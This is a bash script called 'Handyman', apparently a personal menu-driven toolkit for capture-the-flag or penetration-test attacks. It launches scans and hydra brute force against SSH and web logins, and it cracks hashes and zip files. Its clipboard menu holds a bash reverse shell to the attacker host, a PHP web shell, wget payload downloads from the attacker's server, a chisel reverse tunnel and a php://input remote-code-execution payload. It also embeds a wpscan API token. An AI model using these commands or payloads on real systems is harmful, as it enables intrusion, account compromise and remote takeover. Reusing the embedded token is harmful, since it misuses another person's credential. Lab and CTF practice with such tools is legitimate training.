#! /bin/bash

# Colours!
NOCOLOR='\033[0m'
RED='\033[0;31m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHTGRAY='\033[0;37m'
DARKGRAY='\033[1;30m'
LIGHTRED='\033[1;31m'
LIGHTGREEN='\033[1;32m'
YELLOW='\033[1;33m'
LIGHTBLUE='\033[1;34m'
LIGHTPURPLE='\033[1;35m'
LIGHTCYAN='\033[1;36m'
WHITE='\033[1;37m'

LHOST=10.9.233.39
CTF_HOST=

EXTS=.asp,.aspx,.bat,.cgi,.htm,.html,.js,.log,.php,.phtml,.sh,.sql,.txt,.xml

COMMAND_2='Serve tools'
COMMAND_3='Upload handyman'
COMMAND_4="Remove entry from /etc/hosts"

COMMAND_e1='rustscan --accessible --ulimit 5000 -a $RHOST -- -Pn -sV -sC | tee -i nmap-scan.txt | highlight "^\d+\/tcp"'
COMMAND_e2='nmap -Pn -sV -oN nmap-vuln.txt --script vuln $RHOST | highlight "CVE-\d*-\d*"'
COMMAND_e3='ffuf -v -c -recursion -t 64 -o ffuf.txt -e $EXTS -w "$W_COMMON" -u http://$RHOST/FUZZ'
COMMAND_e4='whatweb -v $RHOST'
COMMAND_e5='wpscan --api-token G8ifDn8HmQOCnzEB9Z7i9NkJDX9cGvfmPPbOdxTXNFk -v -o wpscan.txt --url http://$RHOST'

COMMAND_n1='nc -nlvp 4444'
COMMAND_n2='ssh $USER@$RHOST -p 22'
COMMAND_n3='chisel server -p 9999 --reverse -v'
COMMAND_n4='ssh -i id_rsa USER@$RHOST -D 9050 -N -f'

COMMAND_u1='scp ~/Tools/linpeas.sh $USER@$RHOST:/tmp'
COMMAND_u2='scp ~/Tools/chisel $USER@$RHOST:/tmp'

COMMAND_b1='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST ssh -s PORT'
COMMAND_b2='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $RHOST -s 80 http-post-form "/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed"'
COMMAND_b3='ffuf -v -t 8 -X POST -w $W_COMMON -u http://$RHOST/login.php -d "key=FUZZ"'
COMMAND_b4='fcrackzip -D -v -p "$W_PASSWORD" file.zip'
COMMAND_b5='python2 /usr/share/john/ssh2john.py id_rsa > key.hash'
COMMAND_b6='john key.hash --wordlist=$W_PASSWORD --format=FORMAT'

COMMAND_d1='binwalk -e file.jpg'
COMMAND_d2='steghide extract -sf file.jpg'
COMMAND_d3='7z x file.zip'

COMMAND_t1='haiti HASH'
COMMAND_t2='python ~/Tools/wordlistctl/wordlistctl.py search/list -g GROUP'
COMMAND_t3='python ~/Tools/wordlistctl/wordlistctl.py fetch -d -b ~/Tools/wordlists -l KEYWORD'

LINK_1="http://$RHOST/robots.txt"
LINK_2="https://gtfobins.github.io/"

CLIP_1="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
CLIP_2="export TERM=xterm"
CLIP_3="stty raw -echo; fg"
CLIP_4="<?php system($_GET[\"c\"]); ?>"
CLIP_5="bash -i >& /dev/tcp/$LHOST/4444 0>&1"
CLIP_6="wget -O /tmp/handyman http://$LHOST:8000/handyman_cp"
CLIP_7="wget -O /tmp/chisel http://$LHOST:8000/chisel"
CLIP_8="/tmp/chisel client $LHOST:9999 R:$LHOST:8888:127.0.0.1:[OPEN_PORT]"
CLIP_9="curl -X POST --data \"<?php echo shell_exec('id'); ?>\" \"http://$RHOST/index.php?page=php://input%00\" -k -v"

show_menus() {
  clear
  echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo -e "                 ${ORANGE}$LHOST${NOCOLOR} - Handyman - ${RED}$RHOST${NOCOLOR}"
  echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo -e "  ${LIGHTGREEN}Setup${NOCOLOR}"
  echo -e "  ------"
  echo -e "  ${YELLOW}1${NOCOLOR}) Setup target (${YELLOW}R${NOCOLOR}HOST)"
  echo -e "  ${YELLOW}2${NOCOLOR}) $COMMAND_2"
  echo -e "  ${YELLOW}3${NOCOLOR}) $COMMAND_3"
  echo -e "  ${YELLOW}4${NOCOLOR}) $COMMAND_4"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Enumeration${NOCOLOR}"
  echo -e "  -------------"
  echo -e "  ${YELLOW}e1${NOCOLOR}) $COMMAND_e1 (${YELLOW}e11${NOCOLOR} for output)"
  echo -e "  ${YELLOW}e2${NOCOLOR}) $COMMAND_e2"
  echo -e "  ${YELLOW}e3${NOCOLOR}) $COMMAND_e3"
  echo -e "  ${YELLOW}e4${NOCOLOR}) $COMMAND_e4"
  echo -e "  ${YELLOW}e5${NOCOLOR}) $COMMAND_e5"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Network${NOCOLOR}"
  echo -e "  -------"
  echo -e "  ${YELLOW}n1${NOCOLOR}) $COMMAND_n1"
  echo -e "  ${YELLOW}n2${NOCOLOR}) $COMMAND_n2"
  echo -e "  ${YELLOW}n3${NOCOLOR}) $COMMAND_n3"
  echo -e "  ${YELLOW}n4${NOCOLOR}) $COMMAND_n4"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Upload${NOCOLOR}"
  echo -e "  ------"
  echo -e "  ${YELLOW}u1${NOCOLOR}) $COMMAND_u1"
  echo -e "  ${YELLOW}u2${NOCOLOR}) $COMMAND_u2"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Brute Force/Cracking${NOCOLOR}"
  echo -e "  --------------------"
  echo -e "  ${YELLOW}b1${NOCOLOR}) $COMMAND_b1"
  echo -e "  ${YELLOW}b2${NOCOLOR}) $COMMAND_b2"
  echo -e "  ${YELLOW}b3${NOCOLOR}) $COMMAND_b3"
  echo -e "  ${YELLOW}b4${NOCOLOR}) $COMMAND_b4"
  echo -e "  ${YELLOW}b5${NOCOLOR}) $COMMAND_b5"
  echo -e "  ${YELLOW}b6${NOCOLOR}) $COMMAND_b6"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Decoding/Extracting${NOCOLOR}"
  echo -e "  --------------------"
  echo -e "  ${YELLOW}d1${NOCOLOR}) $COMMAND_d1"
  echo -e "  ${YELLOW}d2${NOCOLOR}) $COMMAND_d2"
  echo -e "  ${YELLOW}d3${NOCOLOR}) $COMMAND_d3"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Tools${NOCOLOR}"
  echo -e "  -----"
  echo -e "  ${YELLOW}t1${NOCOLOR}) $COMMAND_t1"
  echo -e "  ${YELLOW}t2${NOCOLOR}) $COMMAND_t2"
  echo -e "  ${YELLOW}t3${NOCOLOR}) $COMMAND_t3"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Links${NOCOLOR}"
  echo -e "  -----"
  echo -e "  ${YELLOW}l1${NOCOLOR}) $LINK_1"
  echo -e "  ${YELLOW}l2${NOCOLOR}) $LINK_2"
  echo -e ""
  echo -e "  ${LIGHTGREEN}Clipboard${NOCOLOR}"
  echo -e "  ---------"
  echo -e "  ${YELLOW}c1${NOCOLOR}) $CLIP_1"
  echo -e "  ${YELLOW}c2${NOCOLOR}) $CLIP_2"
  echo -e "  ${YELLOW}c3${NOCOLOR}) $CLIP_3"
  echo -e "  ${YELLOW}c4${NOCOLOR}) $CLIP_4"
  echo -e "  ${YELLOW}c5${NOCOLOR}) $CLIP_5"
  echo -e "  ${YELLOW}c6${NOCOLOR}) $CLIP_6"
  echo -e "  ${YELLOW}c7${NOCOLOR}) $CLIP_7"
  echo -e "  ${YELLOW}c8${NOCOLOR}) $CLIP_8"
  echo -e "  ${YELLOW}c9${NOCOLOR}) $CLIP_9"
  echo -e ""
  echo -e "  (${YELLOW}o${NOCOLOR})pen. Open split"
  echo -e "  e(${RED}x${NOCOLOR})it. Exit"
  echo -e ""
}

setTmuxEnv () {
  tmux setenv LHOST $LHOST
  tmux setenv RHOST $RHOST
  tmux setenv USER $USER
  tmux setenv CTF_HOST $CTF_HOST
}

openSplit() {
  setTmuxEnv

  tmux split-window -v
  sleep 0.1
}

openLink() {
  xdg-open $1
}

exportRHOST() {
  CLIPBOARD=$(xclip -o)

  if [[ $CLIPBOARD =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    export RHOST=$CLIPBOARD

    tmux send-keys "x" ENTER
    tmux send-keys "export RHOST=$CLIPBOARD" ENTER
    tmux send-keys "$0" ENTER
  else
    if [ $1 = 1 ]; then
      openSplit

      tmux send-keys "export RHOST="
    fi
  fi
}

exportLHOST() {
  if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    export LHOST=$1
  fi
}

runServeTools() {
  openSplit

  # Setup handyman with correct LHOST
  tmux send-keys "cp ~/Tools/handyman.sh ~/Tools/handyman_cp" ENTER
  tmux send-keys 'sed -i "s/L_H_O_S_T/$LHOST/g" ~/Tools/handyman_cp' ENTER
  tmux send-keys 'cd ~/Tools' 'C-m'
  
  # Serve the Tools/ folder
  if [ ! command -v python3 &> /dev/null ]; then
    tmux send-keys "python -m SimpleHTTPServer" ENTER
  else
    tmux send-keys "python3 -m http.server" ENTER
  fi
}

runUploadHandyman() {
  openSplit

  tmux send-keys "cp ~/Tools/handyman.sh ~/Tools/handyman_cp" ENTER
  sleep 0.1

  tmux send-keys 'sed -i "s/L_H_O_S_T/$LHOST/g" ~/Tools/handyman_cp' ENTER
  sleep 0.1

  tmux send-keys "scp ~/Tools/handyman_cp $USER@$RHOST:/tmp/handyman"
}

runV() {
  openSplit

  C="$@"
  tmux send-keys "$C"
}

runCat () {
  openSplit

  C=''

  case $1 in
    e1) C="cat nmap-scan.txt | highlight \"^\d+\/tcp\"";;
    e2) C="cat nmap-vuln.txt | highlight \"CVE-\d*-\d*\"";;
    e5) C="cat wpscan.txt | highlight \"CVE-\d*-\d*\"";;
  esac

  tmux send-keys "$C" Enter
}

runC() {
  echo "$@" | xclip -sel c

  echo "COPIED!"
}

addEtcHosts() {
  export CTF_HOST=$1

  sudo bash -c "echo '$RHOST $CTF_HOST' >> /etc/hosts"

  xdg-open "http://$CTF_HOST"
}

removeEtcHosts() {
  # Remove the entry from /etc/hosts
  sudo bash -c "sed -i '/$RHOST/d' /etc/hosts"
}

runExit() {
  exit 0
}

read_options() {
  local choice
  read -p "Enter choice: " choice
  case $choice in
    1) exportRHOST 1;;
    R) exportRHOST 1;;

    2) runServeTools;;
    3) runUploadHandyman;;
    4) removeEtcHosts;;

    e1) runV $COMMAND_e1;;
    e11) runCat 'e1';;
    e2) runV $COMMAND_e2;;
    e22) runCat 'e2';;
    e3) runV $COMMAND_e3;;
    e4) runV $COMMAND_e4;;
    e5) runV $COMMAND_e5;;
    e55) runCat 'e5';;

    n1) runV $COMMAND_n1;;
    n2) runV $COMMAND_n2;;
    n3) runV $COMMAND_n3;;
    n4) runV $COMMAND_n4;;

    u1) runV $COMMAND_u1;;
    u2) runV $COMMAND_u2;;

    b1) runV $COMMAND_b1;;
    b2) runV $COMMAND_b2;;
    b3) runV $COMMAND_b3;;
    b4) runV $COMMAND_b4;;
    b5) runV $COMMAND_b5;;
    b6) runV $COMMAND_b6;;

    d1) runV $COMMAND_d1;;
    d2) runV $COMMAND_d2;;
    d3) runV $COMMAND_d3;;

    t1) runV $COMMAND_t1;;
    t2) runV $COMMAND_t2;;
    t3) runV $COMMAND_t3;;

    l1) openLink $LINK_1;;
    l2) openLink $LINK_2;;

    c1) runC $CLIP_1;;
    c2) runC $CLIP_2;;
    c3) runC $CLIP_3;;
    c4) runC $CLIP_4;;
    c5) runC $CLIP_5;;
    c6) runC $CLIP_6;;
    c7) runC $CLIP_7;;
    c8) runC $CLIP_8;;
    c9) runC $CLIP_9;;

    o) openSplit;;
    open) openSplit;;
    x) runExit;;
    exit) runExit;;
  esac
}

do_menu() {
  while true
  do
    show_menus
    read_options
  done
}

# if [ ! -z "$1" ]; then
#   exportLHOST $1
# fi

if [ ! -z "$1" ]; then
  addEtcHosts $1
fi

do_menu
